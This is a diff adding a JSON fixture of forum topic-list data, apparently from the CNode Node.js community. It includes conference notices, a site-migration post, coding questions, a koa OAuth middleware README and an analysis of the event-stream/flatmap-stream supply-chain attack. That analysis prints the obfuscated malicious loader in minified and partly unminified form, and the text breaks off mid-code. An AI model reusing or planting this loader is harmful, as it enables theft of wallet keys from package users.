@@ -1,0 +1,685 @@
+{
+  "list" : [
+      {
+          "id" : "5c052988d3b8ab334e8da370",
+          "author_id" : "559a6b4ad488d37a762532a2",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p><img src=\"https://gw.alipayobjects.com/mdn/afts/img/A*lvcKToPvH0EAAAAAAAAAAABjARQnAQ/original?bz=rms\" alt=\"banner\"></p>\n<p>SEE = Seeking Experience &amp; Engineering，意为探索用户体验与工程实践，由蚂蚁金服集团举办，包括专业分享、产品展台、Workshop 等内容。我们希望通过 SEE Conf，能与业界同行一起分享交流体验科技的当前进展，一起探讨切磋体验科技的未来发展，共同努力促进体验设计与技术的开放，让生态繁荣共赢。</p>\n<p>继首届 SEE Conf 成功举办后，第二届 SEE Conf 将于 2019.01.05（周六）在浙江杭州的蚂蚁 Z 空间举办。</p>\n<p>这次我们邀请来同济大学娄永琪院长和浙江大学王锐教授带我们走入学术前沿，还有大量蚂蚁金服体验科技相关的主题分享，期待你来参与。</p>\n<p><a href=\"https://seeconf.antfin.com?from=cnode\">立即报名</a></p>\n<h2>会议日程</h2>\n<h4>主会场</h4>\n<ul>\n<li>9:00 - 9:15：开幕致辞</li>\n<li>9:15 - 10:15：交互设计与人类未来</li>\n<li>10:05 - 11:00：Ant Design 情感化设计</li>\n<li>11:15 - 12:00：科技与人文结合的体验度量</li>\n<li>12:00 - 14:00：午餐时间</li>\n<li>14:00 - 14:45：实时绘制的过去、现在与将来</li>\n<li>15:00 - 15:45：数据可视化之 Story Telling</li>\n<li>15:45 - 16:15：活动 / 茶歇</li>\n<li>16:15 - 17:00：蚂蚁金服前端框架探索之路</li>\n<li>17:15 - 18:00：蚂蚁庄园背后的技术与思考</li>\n</ul>\n<h4>分会场</h4>\n<ul>\n<li>14:00 - 15:45：Workshop：Ant Design 资产一起造</li>\n<li>15:45 - 16:15：活动 / 茶歇</li>\n<li>16:15 - 18:00：圆桌沙龙：Ant Designers 面对面</li>\n</ul>\n<p><img src=\"https://gw.alipayobjects.com/mdn/afts/img/A*G_5DSoWbN1kAAAAAAAAAAABjARQnAQ/original?bz=rms\" alt=\"poster\"></p>\n<h2>大会看点</h2>\n<p>过去 40 年中国从物质极度匮乏时代迅速发展为物质过剩的时代，经济快速发展的同时，一方面带来了巨大的经济成就，另一方面也带来了大量可持续发展的问题。那么体验和设计，是否是开启未来人类可持续发展的金钥匙呢？本次我们非常荣幸邀请到同济大学设计与创意学院 <a href=\"https://baike.baidu.com/item/%E5%A8%84%E6%B0%B8%E7%90%AA\">娄永琪</a> 院长，为大家带来交互设计与人类未来的相关探索。</p>\n<p>技术是人类快速改造世界的手段，学术研究是技术发展的基石和前沿。在计算机上呈现一个高真实感的虚拟世界，是人们长久以来的一个梦想，而实时绘制技术则是其中的核心技术。本届大会我们荣幸的邀请到浙江大学计算机科学与技术学院 <a href=\"http://www.cad.zju.edu.cn/home/rwang/\">王锐</a> 教授，为我们揭开实时绘制技术的神秘面纱。</p>\n<p>没有度量，就没有优化。提升体验是大家共同的使命和目标，但长久以来，如何评估体验是困扰体验技术人的最大难题之一。本次蚂蚁金服数据可视化部负责人 御术 将为大家带来蚂蚁金服体验技术部在这个方向上的探索。</p>\n<p>蚂蚁企业级前端框架 <a href=\"https://github.com/umijs\">UmiJS</a> 正式上线 9 个月，在 Github 收获了 3,000 个 star，作为目前在蚂蚁内最流行的前端框架。从 Redux 到 <a href=\"https://github.com/dvajs\">DvaJS</a> 再到 UmiJS ，它背后的思考是什么？坑是什么？收获是什么？</p>\n<p>多年前知名媒体人柴静，一场《穹顶之下》发布会，引爆了中国社会对于雾霾的热烈讨论。会后很多媒体人会探究为何那次调查发布会有如此的感染力？各大媒体都纷纷总结出用大量的数据可视化的形式说故事，这让论点不但有理，而且有据。本次，我们邀请了蚂蚁金服数据可视化专家（前新华社技术总监）米法为大家带来，数据可视化之 story telling 的相关分享。</p>\n<p>蚂蚁庄园作为支付宝 UV 千万级别的超级应用，开发者在开发过程中，精心打磨产品，追求极致体验。那么，它背后的技术是什么呢？产品的心智是什么？这只小鸡又是怎么一步一步，从雏鸟长成雄鹰的呢？</p>\n<p><a href=\"https://ant.design/\">Ant Design</a> 是蚂蚁金服的明星产品，过去 1 年 Github 的 star 数翻番到达 36,000+，在本届大会原班人马带我们近距离立体式观察它，看如何通过 Ant Design 的情感化设计完善企业级产品。值得一提的是，本次大会除了主会场的报告外，我们还另外开辟分会场让大家有机会零距离跟 Ant Design 设计师一起对它展开探讨。</p>\n<h2>如何报名</h2>\n<p>访问 <a href=\"https://seeconf.antfin.com?from=cnode\">SEE Conf · 蚂蚁金服体验科技大会</a> ，点击「立即报名」按钮</p>\n</div>",
+          "title" : "第二届蚂蚁金服体验科技大会将于19年1月5日举行，期待与你相遇",
+          "last_reply_at" : "2018-12-06T06:11:53.353Z",
+          "good" : false,
+          "top" : true,
+          "reply_count" : 2,
+          "visit_count" : 351,
+          "create_at" : "2018-12-03T13:03:04.128Z",
+          "author" : {
+              "loginname" : "vagusX",
+              "avatar_url" : "https://avatars3.githubusercontent.com/u/6828924?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5bffb25cd6104a4f803a2dfb",
+          "author_id" : "4f3e074762b5c6a270012916",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>第13届D2前端技术论坛（D2前端技术论坛 2018）将于2019年1月6日在杭州和达希尔顿逸林酒店举办。\n大会官方网站：<a href=\"http://d2forum.alibaba-inc.com\">http://d2forum.alibaba-inc.com</a> 如果你对本次会议感兴趣，立即访问报名吧！</p>\n<p>历时近 10 年的发展,成功举办了 12 届，D2 为国内前端领域的开发者和设计者，以及所有对前端技术感兴趣的人提供一个交流的机会，以技术会友， 一起分享技术的乐趣,探讨行业的发展。</p>\n<p><img src=\"//static.cnodejs.org/FtjmBMJk3gso7WqNdgO_twrXkWU7\" alt=\"D2-2nd.jpg\"></p>\n<p>本次大会将设置3个分场，6大主题方向。将邀请近30位演讲嘉宾，给大家带来最前沿，最实用，最有价值的演讲，值得你期待！\n如果你想参加本次大会，可以访问大会网站（<a href=\"http://d2forum.alibaba-inc.com\">http://d2forum.alibaba-inc.com</a>）立即购买门票。</p>\n<h3>大会门票</h3>\n<p>本次大会一共设置四个类型的门票：</p>\n<ul>\n<li>早鸟票（459元）</li>\n<li>早鸟拼团票 （3人成团，只需要399元）</li>\n<li>普通票 （559元）</li>\n<li>晚鸟票 （659元）</li>\n</ul>\n<p>现在就可以购买早鸟票或者早鸟拼团票，数量有限，购买时间也有限制，如果你对本次会议感兴趣，那就赶紧拿起手机访问大会网站购票吧：</p>\n<p>第13届D2前端技术论坛将于2019年1月6日在杭州举办！抢票进行中…  <a href=\"http://d2forum.alibaba-inc.com\">http://d2forum.alibaba-inc.com</a></p>\n<p>2019年1月6日，期待与你在D2现场相见！</p>\n</div>",
+          "title" : "第13届D2前端技术论坛将于2019年1月6日在杭州举办，6大主题方向等你来听",
+          "last_reply_at" : "2018-12-06T04:58:13.227Z",
+          "good" : false,
+          "top" : true,
+          "reply_count" : 7,
+          "visit_count" : 1411,
+          "create_at" : "2018-11-29T09:33:16.969Z",
+          "author" : {
+              "loginname" : "lovevfp",
+              "avatar_url" : "https://avatars.githubusercontent.com/u/285661?v=3&s=120"
+          }
+      },
+      {
+          "id" : "5bd4772a14e994202cd5bdb7",
+          "author_id" : "504c28a2e2b845157708cb61",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>2018年10月27日晚上，突然收到服务器不能访问的告警通知，拜托了狼叔 <a href=\"/user/i5ting\">@i5ting</a> 帮忙看看，结果登不上也ping不通。\n后来收到短信，发现是被ucloud封了，短信内容如下：</p>\n<blockquote>\n<p>【UCloud】尊敬的UCloud用户，您的IP：123.59.77.142  存在URL ：<a href=\"https://cnodejs.org/topic/57239bce5a26c4a841ecbf01\">https://cnodejs.org/topic/57239bce5a26c4a841ecbf01</a> （详细信息请查看邮箱）包含违禁内容（包括但不限于翻墙等），违反了国家有关法律法规。目前依主管单位要求，对您的IP予以封停，请您尽快处理违规内容。待处理完成后请联系技术支持重新开启业务。[4000188113]</p>\n</blockquote>\n<p>然后联系了ucloud的客服，一下就打通了，对方态度挺好处理问题也快。ucloud说是运营商那边封的，不是他们的检测机制。所以需要联系运营商解决。\n考虑到各位亲爱的网友们的行为我无法控制，那么一直跟越来越严格的审查系统对抗只会让自己疲惫，所以我就站点迁到国外。来到了aws jp。</p>\n<p>我大致测了测，电信和移动的访问速度非常快，100ms以内，联通会慢一点，400ms以内吧。</p>\n<p>建议翻墙访问。</p>\n</div>",
+          "title" : "服务器迁移至 aws 日本机房",
+          "last_reply_at" : "2018-12-06T02:44:08.821Z",
+          "good" : false,
+          "top" : true,
+          "reply_count" : 93,
+          "visit_count" : 7760,
+          "create_at" : "2018-10-27T14:33:14.694Z",
+          "author" : {
+              "loginname" : "alsotang",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/1147375?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c079ecb1c62d8334935125e",
+          "author_id" : "5a71687bafa0a121784a9181",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>mongoose 中如何把 _id变成 id 呈现出来，我试过了虚拟值，别名这些，发现都是一起消失跟呈现的。</p>\n<p>我期望返回的是 id 而不是 _id，但 id 的值是 _id 的。</p>\n<p>谢谢！</p>\n</div>",
+          "title" : "mongoose 中如何把 _id变成 id 呈现出来",
+          "last_reply_at" : "2018-12-06T06:52:29.511Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 2,
+          "visit_count" : 175,
+          "create_at" : "2018-12-05T09:47:55.364Z",
+          "author" : {
+              "loginname" : "imruxin",
+              "avatar_url" : "https://avatars3.githubusercontent.com/u/5736012?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5bee4ae7a05b0e0ae443bc90",
+          "author_id" : "56daaf5dc0fa23473d005feb",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h1><a href=\"https://github.com/zhulinwei/l-passport\">l-passport</a></h1>\n<p>集成微信(wechat)、QQ(qq)、百度(baidu)和微博(weibo)于一体的koa中间件与API SDK</p>\n<h2>功能列表</h2>\n<ul>\n<li>OAuth授权</li>\n<li>获取用户基本信息</li>\n</ul>\n<p>koa2中间件，开发者可以通过此中间件获取用户的基本信息（包括用户编号、昵称、头像）</p>\n<h2>Installation</h2>\n<pre class=\"prettyprint language-sh\"><code>npm install l-passport -S\n</code></pre><h2>Usage</h2>\n<h3>Authentication</h3>\n<p>引入l-passport并配置</p>\n<pre class=\"prettyprint language-js\"><code>const passport = require(&#x27;l-passport&#x27;);\n\n&#x2F;&#x2F; 微信登录：设置appId与app secret\npassport.initialize({\n  provider: &#x27;wechat&#x27;\n  appId: &#x27;your_app_id&#x27;,\n  appSecret: &#x27;your_app_secret&#x27;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat&#x27;, passport.authorization(&#x27;wechat&#x27;), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n</code></pre><p>如果需要配置多个平台（如web、ios、android），建议参考如下代码</p>\n<pre class=\"prettyprint language-js\"><code>const passport = require(&#x27;l-passport&#x27;);\n\npassport.initialize({\n  provider: &#x27;wechat&#x27;, \n  clients: [\n    { platform: &#x27;web&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n    { platform: &#x27;ios&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n    { platform: &#x27;android&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n  ]\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat_web&#x27;, passport.authorization(&#x27;wechat&#x27;, { platform: &#x27;web&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat_ios&#x27;, passport.authorization(&#x27;wechat&#x27;, { platform: &#x27;ios&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat_android&#x27;, passport.authorization(&#x27;wechat&#x27;, { platform: &#x27;android&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n</code></pre><p>如果需要配置多个服务提供商与多个平台，建议参考如下代码</p>\n<pre class=\"prettyprint language-js\"><code>const passport = require(&#x27;l-passport&#x27;);\n\npassport.initialize([\n  {\n    provider: &#x27;wechat&#x27;, \n    clients: [\n      { platform: &#x27;web&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n      { platform: &#x27;ios&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n      { platform: &#x27;android&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n    ]\n  },\n  {\n    provider: &#x27;baidu&#x27;, \n    clients: [\n      { platform: &#x27;web&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27;, redirect: &#x27;your_baidu_redirect&#x27; },\n      { platform: &#x27;ios&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27;, redirect: &#x27;your_baidu_redirect&#x27;},\n      { platform: &#x27;android&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27;, redirect: &#x27;your_baidu_redirect&#x27; },\n    ]\n  }\n]);\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat_web&#x27;, passport.authorization(&#x27;wechat&#x27;, { platform: &#x27;web&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;baidu_ios&#x27;, passport.authorization(&#x27;baidu&#x27;, { platform: &#x27;ios&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n</code></pre><h4>配置参数说明：</h4>\n<ul>\n<li><code>provider</code>: - 服务提供商（必选）\n<ul>\n<li>当前可选：qq、baidu、weibo、wechat</li>\n</ul>\n</li>\n<li><code>appId</code>: - 应用编号（必填）</li>\n<li><code>appSecret</code>: - 应用秘钥（必填）</li>\n<li><code>redirect</code>: - 应用回调地址（选填）\n<ul>\n<li>用于生成授权地址或完成授权认证</li>\n</ul>\n</li>\n<li><code>platform</code>: - 服务平台（选填）</li>\n<li><code>scope</code>: - scope值（选填）</li>\n<li><code>state</code>: - state值（选填）</li>\n</ul>\n<h3>Authentication Url</h3>\n<p>注意：不同的服务提供商之间，在认证时对回调地址的处理方式各不相同，如微信不会检查回调函数，微博和QQ只需核查回调函数的域名，而百度则需要核查包括Query参数在内的整个回调地址</p>\n<p>l-passport支持两种方式设置对调函数</p>\n<p>1.配置设置</p>\n<pre class=\"prettyprint language-js\"><code>const passport = require(&#x27;l-passport&#x27;);\n\npassport.initialize({\n  provider: &#x27;baidu&#x27;\n  appId: &#x27;your_app_id&#x27;,\n  appSecret: &#x27;your_app_secret&#x27;,\n  redirect: &#x27;your_app_redirect&#x27;,\n  state: &#x27;your_app_state&#x27;,\n  scope: &#x27;your_app_scope&#x27;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;baidu&#x27;, passport.authorization(&#x27;baidu&#x27;), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n\n</code></pre><p>2.动态设置</p>\n<p>将redirect、state、scope放在路由的Query参数中，如/login/baidu?redirect=your_redirect&amp;state=your_state&amp;scope=your_scope</p>\n<h3>拓展登录策略</h3>\n<p>l-passport已经集成如下：</p>\n<blockquote>\n<ul>\n<li>1.qq：QQ登录</li>\n<li>2.baidu：百度登录</li>\n<li>3.weibo：微博登录</li>\n<li>4.wechat：微信登录</li>\n</ul>\n</blockquote>\n<p>如果开发者觉得当前集成的登录策略无法满足需求时，可以自行拓展，其基本形式如下：</p>\n<pre class=\"prettyprint language-js\"><code>class YourStragety {\n  &#x2F;&#x2F; 服务提供商提供的授权地址  \n  getAuthorizeUrl(redirect, state, scope) {}\n\n  &#x2F;&#x2F; 用户通过授权后的认证过程\n  authorize(code) {}\n}\n\npassport.use(&#x27;your_stagety_name&#x27;, YourStragety);\n</code></pre><h3>用户信息格式</h3>\n<p>认证完成后用户信息将挂载ctx.state.passport中，其基本格式如下：</p>\n<pre class=\"prettyprint language-json\"><code>{\n  &quot;provider&quot;: &quot;服务提供商&quot;,\n  &quot;uid&quot;     : &quot;用户编号&quot;,\n  &quot;nickname&quot;: &quot;用户昵称&quot;,\n  &quot;avatar&quot;  : &quot;用户头像&quot;,\n  &quot;body&quot;    : {}\n}\n</code></pre><p>keyword：QQ OAuth2、Wechat OAuth2、Baidu OAuth2、Weibo OAuth2</p>\n</div>",
+          "title" : "l-passport：集成微信、QQ、百度和微博登录于一体的koa中间件",
+          "last_reply_at" : "2018-12-06T06:25:39.477Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 6,
+          "visit_count" : 797,
+          "create_at" : "2018-11-16T04:43:19.582Z",
+          "author" : {
+              "loginname" : "zhulinwei",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/17670262?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c0620c4d3b8ab334e8da79e",
+          "author_id" : "550973933135610a365b01fa",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>论坛react用户多吗？在cnodejs处女宣布我的状态管理框架react-control-center准备开源了！做开源好累，api文档等都要精心维护，目前核心api都已经稳定了。\n个人项目用起来还是挺happy的，经过一步步抽象，准备开源出来，也许有人问有了redux，有了mobx，为什么还需要react-controller-center，因为我作为redux用户，\n还是觉得redux对代码的入侵挺大，在cc（react-control-center的简称）的世界里，一切数据都从state取，cc自动帮你广播你的状态到其他cc实例，引入cc对你现有的代码是0改动（如果你不需要启用cc的高级功能），你可以对已有项目渐进式的交给cc处理，局部替换，无论你的项目是否已经严重的redux化，cc并不会影响redux的工作,\n好了说了这么多，在未来的几天内会公布一个示例代码工程，引导大家逐步了解cc和使用cc.\n… 此贴 to be continued!</p>\n</div>",
+          "title" : "最近五天疯狂coding，准备开源一个状态管理框架react-control-center",
+          "last_reply_at" : "2018-12-06T04:58:50.471Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 8,
+          "visit_count" : 435,
+          "create_at" : "2018-12-04T06:37:56.343Z",
+          "author" : {
+              "loginname" : "fantasticsoul",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c0546c0d3b8ab334e8da3e3",
+          "author_id" : "5ba61ea38f5b0c1c59ea10b6",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h1>ChineseChess</h1>\n<h3>试玩链接：<a href=\"http://htmlpreview.github.io/?https://github.com/xiugangzhang/ChineseChess/blob/master/ChineseChess.html\">http://htmlpreview.github.io/?https://github.com/xiugangzhang/ChineseChess/blob/master/ChineseChess.html</a></h3>\n<h3>备用链接：<a href=\"http://vip.52tech.tech/game/chinesechess/index.html\">http://vip.52tech.tech/game/chinesechess/index.html</a></h3>\n<h2>目前已经实现的功能</h2>\n<ul>\n<li>V1.0 : 实现棋子的布局，画布及游戏场景的初始化</li>\n<li>V2.0 : 实现棋子的颜色改变</li>\n<li>V3.0 ：实现所有象棋的走棋规则</li>\n<li>V4.0 : 实现所有棋子的吃子功能（测试中）</li>\n</ul>\n<h3>使用HTML5中的Canvas画布技术实现了一个中国象棋项目，目前还有bug，还在测试……</h3>\n<p><img src=\"//static.cnodejs.org/FuhlNTfnD381C7sMz3fLcgoG02e1\" alt=\"00.jpg\"></p>\n<p>GItHub源码：<a href=\"https://github.com/xiugangzhang/ChineseChess\">https://github.com/xiugangzhang/ChineseChess</a></p>\n</div>",
+          "title" : "使用HTML5开发的一个中国象棋小游戏",
+          "last_reply_at" : "2018-12-06T04:36:32.531Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 2,
+          "visit_count" : 308,
+          "create_at" : "2018-12-03T15:07:44.410Z",
+          "author" : {
+              "loginname" : "xiugangzhang",
+              "avatar_url" : "https://avatars3.githubusercontent.com/u/29092258?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5b5e78f5673571454c633cea",
+          "author_id" : "5b56866ae740336c7bedb345",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p><strong>koa2实战项目介绍（真全栈）：</strong></p>\n<p><strong>Nodejs+koa2实战视频教程</strong>从零开始一步一步让你学会Koa基础以及用用<strong>Koa开发项目</strong>，本教程涉及 用户权限判断 、<strong>验证码</strong> 、分页、多级分类、<strong>ueditor可视化富文本编辑器</strong>、图片上传、<strong>底层DB库封装</strong>、<strong>扩展art-template的核心方法、<strong>ajax改变状态、ajax排序、以及赠送的</strong>Socket.io机器人</strong> 、Socket.io多人聊天室、<strong>Socket.io群聊</strong>、前后端分离 <strong>RESTful API Api</strong>接口、购买域名 服务器、域名备案、<strong>nginx负载均衡</strong>、<strong>域名解析部署nodejs程序</strong>、Nodejs进程管理器pm2模块、Koa操作<strong>mysql数据库</strong></p>\n<p><strong>地址：</strong> <a href=\"https://www.itying.com/goods-800.html\">Koa2实战视频教程下载地址点我</a></p>\n<p><strong>2018 Nodejs+Koa2入门实战视频教程百度网盘下载地址（41讲免费基础下载地址）：</strong></p>\n<p><a href=\"https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w\">https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w</a></p>\n</div>",
+          "title" : "Nodejs+koa2实战视频教程【87讲】--Koa2+Nodejs+MongoDb打造企业级CMS前后端全栈项目实战视频教程",
+          "last_reply_at" : "2018-12-06T04:19:57.027Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 56,
+          "visit_count" : 9626,
+          "create_at" : "2018-07-30T02:33:25.113Z",
+          "author" : {
+              "loginname" : "songsunli",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/41601667?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c069b951c62d83349350c5d",
+          "author_id" : "5c0536f21c62d83349350420",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>目前公司web项目基于koa2,项目业务逻辑复杂之后,感觉层级,结构很混乱,各位大佬能否分享一下自己觉着好的项目案例或者链接,学习一下.\n目前存在以下问题:\n1.接口业务复杂,跨系统,目前通过grpc通信,如何保障数据一致性,错误回滚;\n2.项目结构划分不清楚,对于服务层,控制层,没有清晰界限,;\n3.目前没有单元测试,是否必要,不清楚怎么把一个复杂接口划分一个模块单元,求示例代码;\n4.对于node很多模块还没用到,多进程.\n如果问题太小白,请忽略哈,如果有架构方面入门书籍推荐更好了.</p>\n</div>",
+          "title" : "求一些成熟项目架构源码分享",
+          "last_reply_at" : "2018-12-06T04:10:55.741Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 7,
+          "visit_count" : 318,
+          "create_at" : "2018-12-04T15:21:57.707Z",
+          "author" : {
+              "loginname" : "yanqi321",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/22360047?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c07dcc9d3b8ab334e8db355",
+          "author_id" : "5a2a98d5d92f2f5b185acd16",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>如果使用yaml文件该怎么配置 或者 有没有其它的配置方式 官网上面介绍的是npm的方式 本人对这方面小白 求解答</p>\n</div>",
+          "title" : "node-egg框架怎么自动化部署 持续集成",
+          "last_reply_at" : "2018-12-06T03:34:28.621Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 2,
+          "visit_count" : 166,
+          "create_at" : "2018-12-05T14:12:25.505Z",
+          "author" : {
+              "loginname" : "teenth",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/16316491?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c0499ab887c5864fafe1e31",
+          "author_id" : "58d140302c8bf2a836456213",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>如果你是JavaScript或者区块链开发者，如果你有关注区块链以及比特币，那么你应该听说了比特币钱包<a href=\"https://copay.io/\">Copay</a>被黑客攻击的事情。但是，你知道这是怎么回事吗？</p>\n<h3>总结</h3>\n<ul>\n<li>比特币钱包<a href=\"https://github.com/bitpay/copay\">copay</a>依赖<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块；</li>\n<li>黑客从骗取了<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块的npm发布权限；</li>\n<li>黑客为<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块添加了依赖<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>；</li>\n<li><a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>含有黑客代码，仅会在<a href=\"https://github.com/bitpay/copay\">copay</a>项目中正确执行，窃取用户的密码、私钥等信息，从而盗取比特币；</li>\n<li>有人说什么Vue可能遭受攻击，其实没有这回事，因为黑客代码只会在<a href=\"https://github.com/bitpay/copay\">copay</a>项目中正确执行。只有<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json\">package.json</a>中的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>字符串&quot;A Secure Bitcoin Wallet&quot;能够解密黑客代码；而且，黑客的代码是为<a href=\"https://github.com/bitpay/copay\">copay</a>量身定做的，对其他项目没有作用；再说，黑客是来窃取的比特币的，又不是挖矿，你的项目有比特币给人家偷吗?</li>\n</ul>\n<h3>Q&amp;A</h3>\n<ul>\n<li>哪个版本的<a href=\"https://github.com/bitpay/copay\">copay</a>被攻击了？<strong>5.0.2到5.1.0</strong></li>\n<li>哪个版本的<a href=\"https://www.npmjs.com/package/event-stream\">event-stream</a>被攻击了？<strong>3.3.6</strong></li>\n<li>哪个版本的<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>被攻击了？<strong>0.1.1</strong></li>\n<li>Vue会受到攻击吗？<strong>不会</strong></li>\n</ul>\n<p>另外，欢迎大家免费试用<a href=\"https://www.fundebug.com/\">Fundebug</a>的错误监控服务哈~</p>\n<h3>寻找flatmap-stream中的黑客代码</h3>\n<p><a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>已经被npm删除了，不过还能在<a href=\"https://unpkg.com/#/\">UNPKG</a>上找到代码：<a href=\"https://unpkg.com/flatmap-stream@0.1.1/index.min.js\">https://unpkg.com/flatmap-stream@0.1.1/index.min.js</a></p>\n<p><strong>index.min.js</strong>是经过压缩的代码，因此可读性很差：</p>\n<pre class=\"prettyprint language-javascript\"><code>var Stream=require(&quot;stream&quot;).Stream;module.exports=function(e,n){var i=new Stream,a=0,o=0,u=!1,f=!1,l=!1,c=0,s=!1,d=(n=n||{}).failures?&quot;failure&quot;:&quot;error&quot;,m={};function w(r,e){var t=c+1;if(e===t?(void 0!==r&amp;&amp;i.emit.apply(i,[&quot;data&quot;,r]),c++,t++):m[e]=r,m.hasOwnProperty(t)){var n=m[t];return delete m[t],w(n,t)}a===++o&amp;&amp;(f&amp;&amp;(f=!1,i.emit(&quot;drain&quot;)),u&amp;&amp;v())}function p(r,e,t){l||(s=!0,r&amp;&amp;!n.failures||w(e,t),r&amp;&amp;i.emit.apply(i,[d,r]),s=!1)}function b(r,t,n){return e.call(null,r,function(r,e){n(r,e,t)})}function v(r){if(u=!0,i.writable=!1,void 0!==r)return w(r,a);a==o&amp;&amp;(i.readable=!1,i.emit(&quot;end&quot;),i.destroy())}return i.writable=!0,i.readable=!0,i.write=function(r){if(u)throw new Error(&quot;flatmap stream is not writable&quot;);s=!1;try{for(var e in r){a++;var t=b(r[e],a,p);if(f=!1===t)break}return!f}catch(r){if(s)throw r;return p(r),!f}},i.end=function(r){u||v(r)},i.destroy=function(){u=l=!0,i.writable=i.readable=f=!1,process.nextTick(function(){i.emit(&quot;close&quot;)})},i.pause=function(){f=!0},i.resume=function(){f=!1},i};!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,&quot;hex&quot;).toString()}var n=r(e(&quot;2e2f746573742f64617461&quot;)),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,&quot;&quot;),f.exports(n[1])}catch(r){}}();\n</code></pre><p>但是，黑客的黑客代码<strong>隐藏的并不深</strong>，直接添加在<strong>index.min.js</strong>的后面：</p>\n<pre class=\"prettyprint language-javascript\"><code>!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,&quot;hex&quot;).toString()}var n=r(e(&quot;2e2f746573742f64617461&quot;)),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,&quot;&quot;),f.exports(n[1])}catch(r){}}();\n</code></pre><p>使用<a href=\"https://unminify.com/\">unminify</a>将黑客代码还原：</p>\n<pre class=\"prettyprint language-javascript=\"><code>! function() {\n    try {\n        var r = require,\n            t = process;\n\n        function e(r) {\n            return Buffer.from(r, &quot;hex&quot;).toString()\n        }\n        var n = r(e(&quot;2e2f746573742f64617461&quot;)),\n            o = t[e(n[3])][e(n[4])];\n        if (!o) return;\n        var u = r(e(n[2]))[e(n[6])](e(n[5]), o),\n            a = u.update(n[0], e(n[8]), e(n[9]));\n        a += u.final(e(n[9]));\n    